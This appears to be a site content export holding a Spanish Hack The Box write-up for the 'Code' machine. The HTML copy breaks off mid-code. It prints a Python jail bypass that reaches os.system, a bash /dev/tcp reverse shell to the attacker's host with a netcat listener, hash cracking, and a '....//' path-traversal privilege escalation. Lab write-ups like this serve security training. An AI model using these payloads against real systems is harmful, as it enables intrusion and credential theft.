[["Map",1,2,9,10],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.13.5","content-config-digest","809fb02183a141eb","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"ignore\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":false,\"port\":4321,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[],\"responsiveStyles\":false},\"devToolbar\":{\"enabled\":true},\"markdown\":{\"syntaxHighlight\":{\"type\":\"shiki\",\"excludeLangs\":[\"math\"]},\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[],\"rehypePlugins\":[],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false,\"liveContentCollections\":false,\"csp\":false,\"staticImportMetaEnv\":false,\"chromeDevtoolsWorkspace\":false},\"legacy\":{\"collections\":false}}","writeups",["Map",11,12,81,82],"code",{"id":11,"data":13,"body":27,"filePath":28,"digest":29,"rendered":30,"legacyId":80},{"title":14,"os":15,"img":16,"plataforma":17,"dificultad":18,"skills":19,"description":26},"Code","Linux","code/Code_logo.png","Hackthebox","Facil",[20,21,22,23,24,25],"Web Enumeration","Python Jail (Reverse Shell Restriction Bypass)","Database SQLite File Enumeration","Cracking Hashes","Directory Path Traversal Restriction Bypass","Abusing Sudoers (Privelege Escalation)","Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail.","### Descripción\n\nCode es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\n\n### Objetivos\n\n#### Objetivo general\n\nDesarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code. \n\n#### Objetivos Especificos\n\n- Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec. \n- Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail. \n- Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario. \n- Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>  \n\n\n### Analisis de Vulnerabilidades\n\n#### Reconocimiento Inicial\n\nSe comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\n\n**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.\n\n[![Ejecución del comando ping](/code/ping.png)](/code/ping.png)\n\n**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\n\n[![Ejecución del comando ping](/code/nmap.png)](/code/nmap.png)\n\nEste proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\n\n### Analisis de los servicios activos\n\nSeguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo más exhaustivo y especı́fico sobre cada uno de ellos.\n\n#### Puerto 22 (SSH)\n\nEl hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecución, lo que permite establecer una conexión remota segura mediante el uso de protocolos de cifrado para la transmisión de datos. Este servicio, comúnmente utilizado para la administración de servidores y dispositivos de red, brinda acceso a una lı́nea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestión.\n\nLa presencia de SSH implica que, si se dispone de credenciales válidas o se logra explotar alguna vulnerabilidad en su configuración o implementación, un atacante podrı́a obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versión exacta del servicio, verificar la fortaleza de los mecanismos de autenticación implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versión especı́fica.\n\nEn el contexto de una evaluación de seguridad, este hallazgo se considera un punto de interés clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.\n\nEl analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la\nsiguiente imagen:\n\n[![Servicio de SSH (Secure Shell)](/code/ssh.png)](/code/ssh.png)\n\n#### Puerto 5000 (Servicio Web)\n\nAl ejecutar el comando **whatweb** desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutado mediante **Gunicorn 20.0.4**.\n\n**Gunicorn** (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producción debido a su simplicidad y eficiencia. La identificación de su versión especı́fica, en este caso **20.0.4**, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versión. Este tipo de información es fundamental para orientar fases posteriores de análisis, como la búsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluación de posibles vectores de ataque contra el servicio.\n\n[![Servicio web puerto 5000 (Gunicorn)](/code/port5000.png)](/code/port5000.png)\n\nAl acceder al servicio web mediante un navegador utilizando la URL http://10.10.11.62:5000, se observa que el sistema está ejecutando un editor de código para el lenguaje de programación Python. Esta interfaz permite al usuario escribir y ejecutar código Python directamente desde el navegador, lo cual facilita la interacción y el desarrollo rápido dentro del entorno proporcionado.\n\nSi bien esta funcionalidad puede resultar muy útil en contextos controlados y para propósitos legı́timos, también implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar código remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crı́ticas, tales como la ejecución arbitraria de código, escalación de privilegios o acceso no autorizado a recursos sensibles.\n\n[![Pagina web que corre un editor de código en lı́nea](/code/webpage.png)](/code/webpage.png)\n\n\n### Explotación del Sistema \n\nDado que podemos ejecutar código directamente desde la página de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos módulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas útiles que interactúan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y módulos potencialmente peligrosos.\n\n[![Implementación de reglas para impedir el uso de cargas útiles](/code/payload1.png)](/code/payload1.png)\n\nDada la presencia de mecanismos de filtrado que restringen la ejecución directa de código en el servicio web, se torna indispensable identificar métodos para eludir estos filtros con el fin de avanzar en la evaluación de seguridad. Para ello, se llevó a cabo una investigación exhaustiva utilizando palabras clave como “python bypass” en motores de búsqueda y bases de datos especializadas.\n\nComo resultado, se localizaron múltiples artı́culos y recursos técnicos que describen diversas técnicas para superar las restricciones impuestas en entornos Python. Estas técnicas incluyen manipulación avanzada de la sintaxis, uso de codificaciones alternativas, construcción dinámica de código y explotación de vulnerabilidades en componentes especı́ficos.\n\nLa información recopilada servirá como fundamento para la implementación de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.\n\n#### Uso de build-in \n\nEn Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que están disponibles de forma inmediata sin necesidad de importar ningún módulo o librerı́a adicional. Estos elementos forman parte del núcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programación.\n\n### Uso de getattr para evadir restricciones en Python\n\nLa función incorporada getattr(objeto, nombre atributo) en Python permite acceder dinámicamente a los atributos o métodos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente útil para evadir filtros y restricciones que bloquean el acceso directo a funciones o métodos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explı́citas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intención real del código. Como en el siguiente código:\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__') ('o' + 's')\ngetattr(test, 'sy' + 'stem')( 'whoami')\n```\n\nOtro método efectivo para evadir restricciones en entornos Python está explicado en un \n\u003Ca href=\"https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d\" \n   class=\"text-blue-500 font-bold underline hover:text-blue-700 transition\">\n   artículo publicado en Medium\n\u003C/a>. A continuación, se presenta el fragmento de código descrito en dicho artículo:\n\n\n```python\n[w for w in 1..__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('ls')\n```\n\n#### Ejecución de comandos en el sistema\n\nEsto nos permitirá ejecutar comandos de shell sin utilizar palabras clave prohibidas como **≪import≫** u **≪os≫** directamente, utilizando la concatenación de cadenas, es decir, **≪o≫** + **≪s≫**. Sin embargo, tras ejecutar el código, no vemos ningún resultado. Esto sugiere que, aunque el código se esté ejecutando en el host, el resultado no se está devolviendo al frontend. Para verificar si se está ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra máquina utilizando un sencillo listener con el comando **tcpdump** para capturar la respuesta del comando **ping** ejecutado desde el servicio web.\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__') ('o' + 's')\ngetattr (test, 'sy' + 'stem')('ping -c 1 10.10.x.x')\n```\n\nEjecución del código python en la web:\n\n[![Código python en la web](/code/payload2.png)](/code/payload2.png)\n\nRecibimos respuesta por parte del servido al ejecutar el comandon **ping**:\n\n[![Respuesta del comando ping](/code/term1.png)](/code/term1.png)\n\nSeguidamente ejecutaremos el siguiente código en el servicio web para obtener una **shell inversa** mediante **Netcat**:\n\n```python\ntest = getattr(print.__self__, '__im' + 'port__')('o' + 's')\ngetattr(test, 'sy' + 'stem')('bash -c \"bash -i >& /dev/tcp/10.10.x.x/443 0>&1\" ')\n```\nY ejecutamos en nuestra máquina de atacante **Netcat** en el puerto que especificamos en el comando anterior:\n\n```bash\nnc -lnvp 443\n```\nAl ejecutar el código en el servicio web, este establece una conexión de retorno hacia nuestra máquina atacante, otorgándonos una **shell inversa**. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviéramos trabajando desde su propia terminal, posibilitando la ejecución de comandos, la navegación por el sistema de archivos y la recolección de información sensible en tiempo real.\n\n\n[![Ejecucion del código en el servicio web para obtener una shell inversa](/code/payload3.png)](/code/payload3.png)\n\nObtenemos una **Shell Inversa** como **\"app-production\"** que es el usuario que esta corriendo el servicio web:\n\n[![Obteción de la revert shell](/code/nc.png)](/code/nc.png)\n\nSeguidamente, se procede a realizar un tratamiento de la **TTY** con el fin de mejorar la interacción con la sesión obtenida. Este proceso incluye la configuración de una terminal completamente funcional que soporte caracterı́sticas como edición de lı́nea, autocompletado y manejo de señales. De esta manera, al presionar combinaciones de teclas como **Ctrl + C**, la conexión no se interrumpe y se mantiene la estabilidad de la sesión.\n\n```bash\n# En la shell inversa obtenida, ejecutar:\npython3 -c ’import pty; pty.spawn(\"/bin/bash\")’\nCtrl+Z # Presionar las teclas\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n```\nEn la parpeta **home** del usuario **app-production** se encuentra la flag del usuario para ingresar en la plataforma:\n\n[![Flag de user](/code/user.png)](/code/user.png)\n\nAl listar los archivos y carpetas de la máquina encontramos un archivo database.db en la ruta **\"/home/app-production/app/instance/database.db\"** al inspecionar el archivo encontramos credenciales en **\"md5\"** las cuales intentamos romper obteniendo así la contraseña del usuario **development** y **martin**:\n\n[![Archivo sqlite](/code/sqlite.png)](/code/sqlite.png)\n\nAl utilizar hashcat para realizar un ataque de fuerza bruta mediante diccionario y romper las contraseñas obtenemos la contraseña del usuario martin:\n\n[![Contraseña de martin](/code/hashcat.png)](/code/hashcat.png)\n\nAl intentar conectarno a la máquina mediante **ssh** como el usuario **martin** obtenemos acceso:\n\n[![Acceso a la máquina](/code/martin01.png)](/code/martin01.png)\n\nSeguidamente hacemos un reconocimiento de los servicios y permisos que tiene el usuario martin al listar los privilegios del usuario con el comando \"sudo -l\" encontramos que puede ejecutar el comando \"backy.sh\" como root:\n\n[![enumeracion del sistama como martin](/code/martin02.png)](/code/martin02.png)\n\nRealizamos un reconocimiento del script para detectar si tiene alguna bulnerabilidad encontrando que la tarea que realiza es recibir como entrada un archivo **json** que contiene una lista de directorios para realizar un backup de los mismos:\n\n```python\n#!/bin/bash\n\nif [[ $# -ne 1 ]]; then\n    /usr/bin/echo \"Usage: $0 \u003Ctask.json>\"\n    exit 1\nfi\n\njson_file=\"$1\"\n\nif [[ ! -f \"$json_file\" ]]; then\n    /usr/bin/echo \"Error: File '$json_file' not found.\"\n    exit 1\nfi\n\nallowed_paths=(\"/var/\" \"/home/\")\n\nupdated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\")\n\n/usr/bin/echo \"$updated_json\" > \"$json_file\"\n\ndirectories_to_archive=$(/usr/bin/echo \"$updated_json\" | /usr/bin/jq -r '.directories_to_archive[]')\n\nis_allowed_path() {\n    local path=\"$1\"\n    for allowed_path in \"${allowed_paths[@]}\"; do\n        if [[ \"$path\" == $allowed_path* ]]; then\n            return 0\n        fi\n    done\n    return 1\n}\n\nfor dir in $directories_to_archive; do\n    if ! is_allowed_path \"$dir\"; then\n        /usr/bin/echo \"Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed.\"\n        exit 1\n    fi\ndone\n\n/usr/bin/backy \"$json_file\"\n```\n\nEncontramos una vulnerabilidad en la linea:\n\n```python\nupdated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\")\n```\n\nEn donde el script realiza un filtrado de un path traversal eliminando el **`../`**, pero solo lo hace una vez, permitiéndonos escribir **`....//`** en el archivo JSON para apuntar a otro directorio como ser el directorio **root**. \n\nEn el directorio home del usuario martin encontramos un directorio con el nombre backups al ingresar en el encontramos un comprimido **.tar.bz2** y un archivo **task.json** al investigar el archivo json enconramos:\n\n[![Arvhivo task](/code/task01.png)](/code/task01.png)\n\nAl editar el campo `directories_to_archive` y sustituir `/home/app-production/app` por `/home/....//root` dando como resultado en el archivo json:\n\n[![Archivo json modificado](/code/task02.png)](/code/task02.png)\n\nAl ejecutar el comando `sudo /usr/bin/backy.sh` generamos un backup de la ruta `/root` que lo almacena en el directorio `/home/martin/backups` como un comprimido `.tar.bz2` en el cual se encuentra al directorio del usuario **root**:\n\n[![Generar comprimido directorio root](/code/task03.png)](/code/task03.png)\n\nProseguimos con descomprimir el archivo generado y asi poder obtener la flag del usuario **root** y si deseamo podemos conectarnos como dicho usuario mediante **ssh** debido a que obtenemos acesso a su **clave ssh**.","src/content/writeups/code.md","f272f40e54164065",{"html":31,"metadata":32},"\u003Ch3 id=\"descripción\">Descripción\u003C/h3>\n\u003Cp>Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\u003C/p>\n\u003Ch3 id=\"objetivos\">Objetivos\u003C/h3>\n\u003Ch4 id=\"objetivo-general\">Objetivo general\u003C/h4>\n\u003Cp>Desarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code.\u003C/p>\n\u003Ch4 id=\"objetivos-especificos\">Objetivos Especificos\u003C/h4>\n\u003Cul>\n\u003Cli>Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec.\u003C/li>\n\u003Cli>Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail.\u003C/li>\n\u003Cli>Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario.\u003C/li>\n\u003Cli>Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"analisis-de-vulnerabilidades\">Analisis de Vulnerabilidades\u003C/h3>\n\u003Ch4 id=\"reconocimiento-inicial\">Reconocimiento Inicial\u003C/h4>\n\u003Cp>Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\u003C/p>\n\u003Cp>\u003Cstrong>Ping\u003C/strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el \u003Cstrong>TTL\u003C/strong>.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/ping.png\">\u003Cimg src=\"/code/ping.png\" alt=\"Ejecución del comando ping\">\u003C/a>\u003C/p>\n\u003Cp>\u003Cstrong>Nmap\u003C/strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/nmap.png\">\u003Cimg src=\"/code/nmap.png\" alt=\"Ejecución del comando ping\">\u003C/a>\u003C/p>\n\u003Cp>Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\u003C/p>\n\u003Ch3 id=\"analisis-de-los-servicios-activos\">Analisis de los servicios activos\u003C/h3>\n\u003Cp>Seguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo más exhaustivo y especı́fico sobre cada uno de ellos.\u003C/p>\n\u003Ch4 id=\"puerto-22-ssh\">Puerto 22 (SSH)\u003C/h4>\n\u003Cp>El hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecución, lo que permite establecer una conexión remota segura mediante el uso de protocolos de cifrado para la transmisión de datos. Este servicio, comúnmente utilizado para la administración de servidores y dispositivos de red, brinda acceso a una lı́nea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestión.\u003C/p>\n\u003Cp>La presencia de SSH implica que, si se dispone de credenciales válidas o se logra explotar alguna vulnerabilidad en su configuración o implementación, un atacante podrı́a obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versión exacta del servicio, verificar la fortaleza de los mecanismos de autenticación implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versión especı́fica.\u003C/p>\n\u003Cp>En el contexto de una evaluación de seguridad, este hallazgo se considera un punto de interés clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.\u003C/p>\n\u003Cp>El analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la\nsiguiente imagen:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/ssh.png\">\u003Cimg src=\"/code/ssh.png\" alt=\"Servicio de SSH (Secure Shell)\">\u003C/a>\u003C/p>\n\u003Ch4 id=\"puerto-5000-servicio-web\">Puerto 5000 (Servicio Web)\u003C/h4>\n\u003Cp>Al ejecutar el comando \u003Cstrong>whatweb\u003C/strong> desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutado mediante \u003Cstrong>Gunicorn 20.0.4\u003C/strong>.\u003C/p>\n\u003Cp>\u003Cstrong>Gunicorn\u003C/strong> (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producción debido a su simplicidad y eficiencia. La identificación de su versión especı́fica, en este caso \u003Cstrong>20.0.4\u003C/strong>, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versión. Este tipo de información es fundamental para orientar fases posteriores de análisis, como la búsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluación de posibles vectores de ataque contra el servicio.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/port5000.png\">\u003Cimg src=\"/code/port5000.png\" alt=\"Servicio web puerto 5000 (Gunicorn)\">\u003C/a>\u003C/p>\n\u003Cp>Al acceder al servicio web mediante un navegador utilizando la URL \u003Ca href=\"http://10.10.11.62:5000\">http://10.10.11.62:5000\u003C/a>, se observa que el sistema está ejecutando un editor de código para el lenguaje de programación Python. Esta interfaz permite al usuario escribir y ejecutar código Python directamente desde el navegador, lo cual facilita la interacción y el desarrollo rápido dentro del entorno proporcionado.\u003C/p>\n\u003Cp>Si bien esta funcionalidad puede resultar muy útil en contextos controlados y para propósitos legı́timos, también implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar código remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crı́ticas, tales como la ejecución arbitraria de código, escalación de privilegios o acceso no autorizado a recursos sensibles.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/webpage.png\">\u003Cimg src=\"/code/webpage.png\" alt=\"Pagina web que corre un editor de código en lı́nea\">\u003C/a>\u003C/p>\n\u003Ch3 id=\"explotación-del-sistema\">Explotación del Sistema\u003C/h3>\n\u003Cp>Dado que podemos ejecutar código directamente desde la página de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos módulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas útiles que interactúan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y módulos potencialmente peligrosos.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/payload1.png\">\u003Cimg src=\"/code/payload1.png\" alt=\"Implementación de reglas para impedir el uso de cargas útiles\">\u003C/a>\u003C/p>\n\u003Cp>Dada la presencia de mecanismos de filtrado que restringen la ejecución directa de código en el servicio web, se torna indispensable identificar métodos para eludir estos filtros con el fin de avanzar en la evaluación de seguridad. Para ello, se llevó a cabo una investigación exhaustiva utilizando palabras clave como “python bypass” en motores de búsqueda y bases de datos especializadas.\u003C/p>\n\u003Cp>Como resultado, se localizaron múltiples artı́culos y recursos técnicos que describen diversas técnicas para superar las restricciones impuestas en entornos Python. Estas técnicas incluyen manipulación avanzada de la sintaxis, uso de codificaciones alternativas, construcción dinámica de código y explotación de vulnerabilidades en componentes especı́ficos.\u003C/p>\n\u003Cp>La información recopilada servirá como fundamento para la implementación de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.\u003C/p>\n\u003Ch4 id=\"uso-de-build-in\">Uso de build-in\u003C/h4>\n\u003Cp>En Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que están disponibles de forma inmediata sin necesidad de importar ningún módulo o librerı́a adicional. Estos elementos forman parte del núcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programación.\u003C/p>\n\u003Ch3 id=\"uso-de-getattr-para-evadir-restricciones-en-python\">Uso de getattr para evadir restricciones en Python\u003C/h3>\n\u003Cp>La función incorporada getattr(objeto, nombre atributo) en Python permite acceder dinámicamente a los atributos o métodos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente útil para evadir filtros y restricciones que bloquean el acceso directo a funciones o métodos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explı́citas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intención real del código. Como en el siguiente código:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)( \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'whoami'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Otro método efectivo para evadir restricciones en entornos Python está explicado en un\n\u003Ca href=\"https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d\" class=\"text-blue-500 font-bold underline hover:text-blue-700 transition\">\nartículo publicado en Medium\n\u003C/a>. A continuación, se presenta el fragmento de código descrito en dicho artículo:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[w \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">..\u003C/span>\u003Cspan style=\"color:#79B8FF\">__class__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.__base__.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__subclasses__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() \u003C/span>\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> w.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__name__\u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'Quitter'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">][\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].\u003C/span>\u003Cspan style=\"color:#79B8FF\">__init__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__globals__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'s'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].modules[\u003C/span>\u003Cspan 